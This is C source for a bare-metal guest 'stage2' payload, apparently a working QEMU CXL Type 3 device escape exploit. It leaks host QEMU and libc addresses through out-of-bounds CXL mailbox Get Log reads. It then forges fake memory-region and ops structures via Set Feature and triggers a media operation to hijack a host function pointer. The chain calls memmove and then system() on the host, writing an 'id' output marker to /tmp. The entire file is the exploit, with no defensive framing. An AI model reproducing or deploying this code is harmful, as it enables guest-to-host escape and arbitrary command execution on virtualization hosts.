typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;

typedef struct {
    u32 lo;
    u32 hi;
} U64;

typedef struct __attribute__((packed, aligned(8))) {
    u32 lo;
    u32 hi;
} QWord;

#define COMP_BAR       0xe0000000u
#define DEV_REG_BAR    0xe0010000u
#define MAILBOX        (DEV_REG_BAR + 0x88u)
#define MBOX_CTRL      (MAILBOX + 0x04u)
#define MBOX_CMD       (MAILBOX + 0x08u)
#define MBOX_STS       (MAILBOX + 0x10u)
#define MBOX_BG_STS    (MAILBOX + 0x18u)
#define MBOX_PAYLOAD   (MAILBOX + 0x20u)

#define CMD_GET_LOG    0x0401u
#define CMD_SET_FEAT   0x0502u
#define CMD_MEDIA_OP   0x4402u

#define GET_LOG_OOB_BASE_OFFSET 0x10000u
#define CMD_LOGS_GET_LOG_OFF    0x004ad6f0u
#define MEMMOVE_PLT_OFF         0x003381b0u
#define LIBC_START_MAIN_GOT_OFF 0x01ad6fe8u
#define LIBC_START_MAIN_OFF     0x0002a200u
#define SYSTEM_OFF              0x00058750u

#define RANK_SPARING_WR_ATTRS_OFF     0x006c5b6au
#define GET_LOG_OOB_MEM_BASE_FROM_CT3D 0x00245820u

#define FAKE_FLATVIEW_OFF       0x054eu
#define FAKE_DISPATCH_OFF       0x058eu
#define FAKE_SECTION_OFF        0x05d6u
#define FAKE_MEMORY_REGION_OFF  0x062eu
#define FAKE_OPS_OFF            0x074eu
#define FAKE_BITMAP_OFF         0x07aeu
#define FAKE_COMMAND_OFF        0x07b6u
#define RIP_SMASH_DATA_LEN      0x07eeu

#define DC_TOTAL_CAPACITY_FROM_RANK 0x00aeu
#define DC_NUM_REGIONS_FROM_RANK   0x00e2u
#define DC_REGION0_FROM_RANK       0x00e6u

#define CXL_STATIC_VMEM_SIZE 0x10000000u
#define CXL_CACHELINE_SIZE   0x40u

static u8 fake[RIP_SMASH_DATA_LEN];

static const u8 cel_uuid[16] = {
    0x0d, 0xa9, 0xc0, 0xb5, 0xbf, 0x41, 0x4b, 0x78,
    0x8f, 0x79, 0x96, 0xb1, 0x62, 0x3b, 0x3f, 0x17
};

static const u8 rank_uuid[16] = {
    0x34, 0xdb, 0xaf, 0xf5, 0x05, 0x52, 0x42, 0x81,
    0x8f, 0x76, 0xda, 0x0b, 0x5e, 0x7a, 0x76, 0xa7
};

static const char host_cmd[] =
    "id>/tmp/qemu_cxl_escape_marker";

static inline void outl(u16 port, u32 value)
{
    __asm__ __volatile__("outl %0, %1" : : "a"(value), "Nd"(port));
}

static inline void outb(u16 port, u8 value)
{
    __asm__ __volatile__("outb %0, %1" : : "a"(value), "Nd"(port));
}

static inline u8 inb(u16 port)
{
    u8 value;
    __asm__ __volatile__("inb %1, %0" : "=a"(value) : "Nd"(port));
    return value;
}

static inline void pause_cpu(void)
{
    __asm__ __volatile__("pause");
}

static void cfgw(u32 addr, u32 value)
{
    outl(0x0cf8, addr);
    outl(0x0cfc, value);
}

static void serial_init(void)
{
    outb(0x3f8 + 1, 0x00);
    outb(0x3f8 + 3, 0x80);
    outb(0x3f8 + 0, 0x03);
    outb(0x3f8 + 1, 0x00);
    outb(0x3f8 + 3, 0x03);
    outb(0x3f8 + 2, 0xc7);
    outb(0x3f8 + 4, 0x0b);
}

static void serial_putc(char c)
{
    while ((inb(0x3f8 + 5) & 0x20) == 0) {
        pause_cpu();
    }
    outb(0x3f8, (u8)c);
}

static void serial_puts(const char *s)
{
    while (*s) {
        serial_putc(*s++);
    }
}

static void serial_hex32(u32 v)
{
    static const char h[] = "0123456789abcdef";
    int i;
    for (i = 7; i >= 0; i--) {
        serial_putc(h[(v >> (i * 4)) & 0xf]);
    }
}

static void serial_u64(const char *name, U64 v)
{
    serial_puts(name);
    serial_puts("=0x");
    serial_hex32(v.hi);
    serial_hex32(v.lo);
    serial_puts("\n");
}

static inline void w32(u32 addr, u32 value)
{
    *(volatile u32 *)addr = value;
}

static inline u32 r32(u32 addr)
{
    return *(volatile u32 *)addr;
}

static void mmio_write64(u32 addr, u32 lo, u32 hi)
{
    QWord q;
    q.lo = lo;
    q.hi = hi;
    __asm__ __volatile__(
        "movq %0, %%mm0\n\t"
        "movq %%mm0, (%1)\n\t"
        "emms\n\t"
        :
        : "m"(q), "r"(addr)
        : "memory");
}

static QWord mmio_read64(u32 addr)
{
    QWord q;
    __asm__ __volatile__(
        "movq (%1), %%mm0\n\t"
        "movq %%mm0, %0\n\t"
        "emms\n\t"
        : "=m"(q)
        : "r"(addr)
        : "memory");
    return q;
}

static U64 u64_add(U64 a, u32 b)
{
    U64 r;
    r.lo = a.lo + b;
    r.hi = a.hi + (r.lo < a.lo);
    return r;
}

static U64 u64_sub(U64 a, u32 b)
{
    U64 r;
    r.lo = a.lo - b;
    r.hi = a.hi - (a.lo < b);
    return r;
}

static void zero(void *p, u32 n)
{
    u8 *b = (u8 *)p;
    while (n--) {
        *b++ = 0;
    }
}

static void put32(u8 *b, u32 off, u32 v)
{
    b[off + 0] = (u8)v;
    b[off + 1] = (u8)(v >> 8);
    b[off + 2] = (u8)(v >> 16);
    b[off + 3] = (u8)(v >> 24);
}

static void put64(u8 *b, u32 off, U64 v)
{
    put32(b, off, v.lo);
    put32(b, off + 4, v.hi);
}

static void put64i(u8 *b, u32 off, u32 lo)
{
    put32(b, off, lo);
    put32(b, off + 4, 0);
}

static void payload_write(u32 off, const void *src, u32 n)
{
    volatile u8 *dst = (volatile u8 *)(MBOX_PAYLOAD + off);
    const u8 *s = (const u8 *)src;
    while (n--) {
        *dst++ = *s++;
    }
}

static void payload_write_zero(u32 off, u32 n)
{
    volatile u8 *dst = (volatile u8 *)(MBOX_PAYLOAD + off);
    while (n--) {
        *dst++ = 0;
    }
}

static void mailbox_cmd(u32 opcode, u32 len)
{
    mmio_write64(MBOX_CMD, opcode | (len << 16), 0);
    w32(MBOX_CTRL, 1);
    while (r32(MBOX_CTRL) & 1) {
        pause_cpu();
    }
}

static U64 leak_rel(u32 rel)
{
    u32 off = GET_LOG_OOB_BASE_OFFSET + (rel >> 2);
    payload_write(0, cel_uuid, 16);
    w32(MBOX_PAYLOAD + 16, off);
    w32(MBOX_PAYLOAD + 20, 8);
    mailbox_cmd(CMD_GET_LOG, 24);
    return (U64){ r32(MBOX_PAYLOAD), r32(MBOX_PAYLOAD + 4) };
}

static void send_rank(u16 feature_off, const u8 *data, u32 n)
{
    payload_write(0, rank_uuid, 16);
    w32(MBOX_PAYLOAD + 16, 1);
    w32(MBOX_PAYLOAD + 20, ((u32)1 << 16) | feature_off);
    payload_write_zero(24, 8);
    payload_write(32, data, n);
    mailbox_cmd(CMD_SET_FEAT, 32 + n);
}

static void trigger_media_sanitize(void)
{
    w32(MBOX_PAYLOAD + 0, 0x00000001u);
    w32(MBOX_PAYLOAD + 4, 0x00000001u);
    w32(MBOX_PAYLOAD + 8, CXL_STATIC_VMEM_SIZE);
    w32(MBOX_PAYLOAD + 12, 0);
    w32(MBOX_PAYLOAD + 16, CXL_CACHELINE_SIZE);
    w32(MBOX_PAYLOAD + 20, 0);
    mailbox_cmd(CMD_MEDIA_OP, 24);
    serial_puts("media-op sent\n");
}

static void wait_bg_done(void)
{
    u32 i;
    for (i = 0; i < 0xffffffffu; i++) {
        QWord st = mmio_read64(MBOX_STS);
        if ((st.lo & 1u) == 0) {
            serial_puts("bg done\n");
            break;
        }
        pause_cpu();
    }
}

static void forge_payload(U64 rank_host, U64 fn, U64 opaque, U64 mr_addr,
                          const char *arg)
{
    U64 fake_flatview = u64_add(rank_host, FAKE_FLATVIEW_OFF);
    U64 fake_dispatch = u64_add(rank_host, FAKE_DISPATCH_OFF);
    U64 fake_section = u64_add(rank_host, FAKE_SECTION_OFF);
    U64 fake_mr = u64_add(rank_host, FAKE_MEMORY_REGION_OFF);
    U64 fake_ops = u64_add(rank_host, FAKE_OPS_OFF);
    U64 fake_bitmap = u64_add(rank_host, FAKE_BITMAP_OFF);
    U64 fake_command = u64_add(rank_host, FAKE_COMMAND_OFF);
    u32 region0 = DC_REGION0_FROM_RANK;

    zero(fake, RIP_SMASH_DATA_LEN);

    put64(fake, 0x2e, fake_flatview);
    put64i(fake, DC_TOTAL_CAPACITY_FROM_RANK, CXL_CACHELINE_SIZE);
    fake[DC_NUM_REGIONS_FROM_RANK] = 1;

    put64i(fake, region0 + 0, CXL_STATIC_VMEM_SIZE);
    put64i(fake, region0 + 8, CXL_CACHELINE_SIZE);
    put64i(fake, region0 + 16, CXL_CACHELINE_SIZE);
    put64i(fake, region0 + 24, CXL_CACHELINE_SIZE);
    put64(fake, region0 + 40, fake_bitmap);
    fake[region0 + 96] = 1;
    fake[region0 + 0x6c] = 1;

    put32(fake, FAKE_FLATVIEW_OFF + 16, 1);
    put64(fake, FAKE_FLATVIEW_OFF + 40, fake_dispatch);
    put64(fake, FAKE_FLATVIEW_OFF + 48, fake_mr);

    put64(fake, FAKE_DISPATCH_OFF, fake_section);

    put64i(fake, FAKE_SECTION_OFF, CXL_CACHELINE_SIZE);
    put64i(fake, FAKE_SECTION_OFF + 8, 0);
    put64(fake, FAKE_SECTION_OFF + 16, fake_mr);
    put64(fake, FAKE_SECTION_OFF + 24, fake_flatview);
    put64(fake, FAKE_SECTION_OFF + 32, mr_addr);
    put64i(fake, FAKE_SECTION_OFF + 40, CXL_STATIC_VMEM_SIZE);

    put64(fake, FAKE_MEMORY_REGION_OFF + 80, fake_ops);
    if (arg) {
        u32 i = 0;
        while (arg[i] && FAKE_COMMAND_OFF + i < RIP_SMASH_DATA_LEN - 1) {
            fake[FAKE_COMMAND_OFF + i] = (u8)arg[i];
            i++;
        }
        fake[FAKE_COMMAND_OFF + i] = 0;
        opaque = fake_command;
    }
    put64(fake, FAKE_MEMORY_REGION_OFF + 88, opaque);
    put64i(fake, FAKE_MEMORY_REGION_OFF + 112, CXL_CACHELINE_SIZE);
    fake[FAKE_MEMORY_REGION_OFF + 152] = 1;
    fake[FAKE_MEMORY_REGION_OFF + 154] = 1;

    put64(fake, FAKE_OPS_OFF + 8, fn);
    put32(fake, FAKE_OPS_OFF + 40, 1);
    put32(fake, FAKE_OPS_OFF + 44, 1);
    fake[FAKE_OPS_OFF + 48] = 1;
    put32(fake, FAKE_OPS_OFF + 64, 1);
    put32(fake, FAKE_OPS_OFF + 68, 1);
    fake[FAKE_OPS_OFF + 72] = 1;
    put64i(fake, FAKE_BITMAP_OFF, 0xffffffffu);
    put32(fake, FAKE_BITMAP_OFF + 4, 0xffffffffu);
}

static void fake_write_call(U64 rank_host, U64 fn, U64 opaque, U64 mr_addr,
                            const char *arg)
{
    forge_payload(rank_host, fn, opaque, mr_addr, arg);
    send_rank(0x2e, fake + 0x2e, RIP_SMASH_DATA_LEN - 0x2e);
    trigger_media_sanitize();
    wait_bg_done();
}

static void setup_pci(void)
{
    cfgw(0x80340018u, 0x00353534u);
    cfgw(0x80340020u, 0xe0f0e000u);
    cfgw(0x80340004u, 0x00100006u);

    cfgw(0x80350010u, COMP_BAR);
    cfgw(0x80350014u, 0x00000000u);
    cfgw(0x80350018u, DEV_REG_BAR);
    cfgw(0x8035001cu, 0x00000000u);
    cfgw(0x80350004u, 0x00100006u);
}

void __attribute__((section(".text.start"))) _start(void)
{
    U64 handler, qemu_base, memmove_plt, libc_got, ct3d_host, rank_host;
    U64 leak_slot, leak_src, libc_start, libc_base, system_fn;

    serial_init();
    serial_puts("stage2 start\n");
    setup_pci();
    serial_puts("pci done\n");

    handler = leak_rel(0x80c8);
    serial_u64("handler", handler);
    qemu_base = u64_sub(handler, CMD_LOGS_GET_LOG_OFF);
    memmove_plt = u64_add(qemu_base, MEMMOVE_PLT_OFF);
    libc_got = u64_add(qemu_base, LIBC_START_MAIN_GOT_OFF);
    serial_u64("qemu_base", qemu_base);

    ct3d_host = leak_rel(0x88);
    serial_u64("ct3d", ct3d_host);
    rank_host = u64_add(ct3d_host, RANK_SPARING_WR_ATTRS_OFF);
    serial_u64("rank", rank_host);

    leak_slot = u64_add(ct3d_host, GET_LOG_OOB_MEM_BASE_FROM_CT3D + 0x100u);
    leak_src = u64_sub(libc_got, CXL_CACHELINE_SIZE - 1u);
    serial_puts("fake leak call\n");
    fake_write_call(rank_host, memmove_plt, leak_slot, leak_src, 0);

    libc_start = leak_rel(0x100);
    serial_u64("libc_start", libc_start);
    libc_base = u64_sub(libc_start, LIBC_START_MAIN_OFF);
    system_fn = u64_add(libc_base, SYSTEM_OFF);
    serial_u64("system", system_fn);

    serial_puts("fake system call\n");
    fake_write_call(rank_host, system_fn, (U64){0, 0}, (U64){0, 0}, host_cmd);
    serial_puts("stage2 done\n");

    for (;;) {
        __asm__ __volatile__("hlt");
    }
}
